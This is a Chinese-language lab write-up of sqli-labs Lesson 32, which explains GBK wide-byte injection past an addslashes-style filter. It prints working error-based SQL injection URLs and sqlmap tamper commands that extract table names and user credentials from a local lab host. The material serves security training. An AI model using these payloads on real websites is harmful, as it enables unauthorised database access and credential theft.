---
title: sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠
date: 2018-10-14 21:10:54
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠

---

## 登录界面

![001](/img/sql/Lesson-32/001.png)

## 分析

![002](/img/sql/Lesson-32/002.png)

ord — 返回字符的 ASCII 码值

dechex — 十进制转换为十六进制

将id的值转成16进制,最终在页面显示出来。

![003](/img/sql/Lesson-32/003.png)

![004](/img/sql/Lesson-32/004.png)

现在看看check_addslashes这个自定义函数做什么过滤。

![005](/img/sql/Lesson-32/005.png)

```
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          		//将\用\\替代,即转义\
	echo $string.'<br>';
    $string = preg_replace('/\'/i', '\\\'', $string);            
    //将'用\'替代,即转义'
	echo $string.'<br>';

    $string = preg_replace('/\"/', "\\\"", $string);                                		//将"用\"替代,即转义"
     
	echo $string.'<br>';

    return $string;
```

这里考的是宽字节绕过。

注意上图中有：

mysql_query("SET NAMES gbk");

## 宽字节注入

红日安全团队团队对宽字节注入研究的很细致。

http://www.freebuf.com/column/165567.html

提取下主干

基本概念：

1. 宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节
2. GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节
3. 转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能

宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。

## 注入

利用报错注入

### 获取数据库名

`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,database(),0x7e))%23`

![006](/img/sql/Lesson-32/006.png)

### 获取表名

`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))%23`

这里`0x7365637572697479`是`security`的16进制编码,为的是绕过原来的`'securty'`。

![007](/img/sql/Lesson-32/007.png)

### 获取列名

`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479),0x7e))%23`

![008](/img/sql/Lesson-32/008.png)

### 获取字段

`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`

![009](/img/sql/Lesson-32/009.png)

## SQLMAP

tamper自带了宽字节绕过的脚本unmagicquotes.py

`sqlmap -u "http://192.168.75.132/sql/Less-32/?id=1" --dbms mysql --technique E --tamper unmagicquotes.py`

![010](/img/sql/Lesson-32/010.png)

![011](/img/sql/Lesson-32/011.png)

`sqlmap -u "http://192.168.75.132/sql/Less-32/?id=1" --dbms mysql --technique E --tamper unmagicquotes.py --dbs`

![012](/img/sql/Lesson-32/012.png)

![013](/img/sql/Lesson-32/013.png)

`sqlmap -u "http://192.168.75.132/sql/Less-32/?id=1" --dbms mysql --technique E --tamper unmagicquotes.py -D security --tables`

![014](/img/sql/Lesson-32/014.png)

![015](/img/sql/Lesson-32/015.png)

`sqlmap -u "http://192.168.75.132/sql/Less-32/?id=1" --dbms mysql --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`

![016](/img/sql/Lesson-32/016.png)

![017](/img/sql/Lesson-32/017.png)





